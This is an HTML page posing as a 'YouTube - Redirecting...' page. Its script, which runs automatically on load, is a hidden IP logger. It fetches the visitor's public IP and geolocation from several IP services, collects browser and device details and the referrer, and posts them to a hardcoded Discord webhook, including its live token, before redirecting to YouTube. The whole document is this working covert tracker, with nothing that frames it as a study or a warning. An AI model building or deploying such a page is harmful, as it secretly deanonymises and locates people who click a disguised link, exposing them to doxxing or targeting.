<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Redirecting...</title>
    
    <meta name="discord-webhook" content="https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma">
    
    <meta http-equiv="refresh" content="3;url=https://www.youtube.com">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #333333, #2b2b2b);
            font-family: 'Arial', sans-serif;
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1468632156161970372/iYFdHsPd3dEj7NxeM1Qsaw5aFGLP4pDZnU-FY_t8VFv54H1zUkSQ59E3ORnEh5Dy5_Ma";
        
        async function getRealIP() {
            console.log('Getting IP address...');
            
            const ipServices = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://api.myip.com',
                'https://ipapi.co/json/',
                'https://ipinfo.io/json'
            ];
            
            for (const service of ipServices) {
                try {
                    console.log(`Trying: ${service}`);
                    
                    const response = await fetch(service);
                    
                    if (response.ok) {
                        const data = await response.json();
                        const ip = data.ip || data.client_ip || data.query || 'Unknown';
                        
                        if (ip !== 'Unknown') {
                            console.log(`IP found: ${ip}`);
                            return ip;
                        }
                    }
                } catch (error) {
                    console.log(`Service failed: ${error.message}`);
                    continue;
                }
            }
            
            return 'Unknown';
        }
        
        async function getGeoLocation(ip) {
            if (ip === 'Unknown' || ip.includes('192.168.') || ip.includes('127.0.0.1')) {
                return null;
            }
            
            const geoServices = [
                `https://ipapi.co/${ip}/json/`,
                `https://ipwhois.app/json/${ip}`,
                `https://ipinfo.io/${ip}/json`
            ];
            
            for (const service of geoServices) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        
                        if (data.country || data.country_name) {
                            return {
                                country: data.country_name || data.country || 'Unknown',
                                city: data.city || 'Unknown',
                                region: data.region || data.regionName || 'Unknown',
                                isp: data.org || data.isp || 'Unknown'
                            };
                        }
                    }
                } catch (error) {
                    continue;
                }
            }
            
            return null;
        }
        
        function collectBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                referrer: document.referrer || 'Direct',
                hostname: window.location.hostname,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
        }
        
        async function sendToDiscord(data) {
            console.log('Sending to Discord...');
            
            try {
                const embed = {
                    title: 'ðŸ” NEW VISITOR DETECTED',
                    color: 0xFF0000,
                    timestamp: data.browser.timestamp,
                    fields: [
                        {
                            name: 'ðŸŒ IP Address',
                            value: `\`${data.ip}\``,
                            inline: true
                        },
                        {
                            name: 'ðŸ“ Location',
                            value: data.geo ? 
                                `${data.geo.city}, ${data.geo.country}` :
                                'Unable to determine',
                            inline: true
                        },
                        {
                            name: 'ðŸ–¥ï¸ Device Info',
                            value: `${data.browser.platform} - ${data.browser.screen}`,
                            inline: false
                        },
                        {
                            name: 'ðŸ”— Referrer',
                            value: data.browser.referrer,
                            inline: true
                        },
                        {
                            name: 'ðŸŒ Website',
                            value: data.browser.hostname,
                            inline: true
                        }
                    ],
                    footer: {
                        text: 'IP Logger'
                    }
                };
                
                const payload = {
                    embeds: [embed],
                    username: 'IP Tracker',
                    avatar_url: 'https://cdn.discordapp.com/attachments/847471116316999690/894877973234393118/ezgif-4-b84848c6b4.gif'
                };
                
                const response = await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    console.log('Successfully sent to Discord!');
                    return true;
                } else {
                    console.log(`Discord error: ${response.status}`);
                    return false;
                }
                
            } catch (error) {
                console.log(`Send error: ${error.message}`);
                return false;
            }
        }
        
        async function collectData() {
            try {
                const ip = await getRealIP();
                const geo = await getGeoLocation(ip);
                const browserData = collectBrowserData();
                
                const collectedData = {
                    ip: ip,
                    geo: geo,
                    browser: browserData
                };
                
                await sendToDiscord(collectedData);
                
            } catch (error) {
                console.log(`Error: ${error.message}`);
            }
        }
        
        window.addEventListener('load', () => {
            collectData();
            
            setTimeout(() => {
                window.location.href = 'https://www.youtube.com';
            }, 3000);
        });
    </script>
</body>
</html>
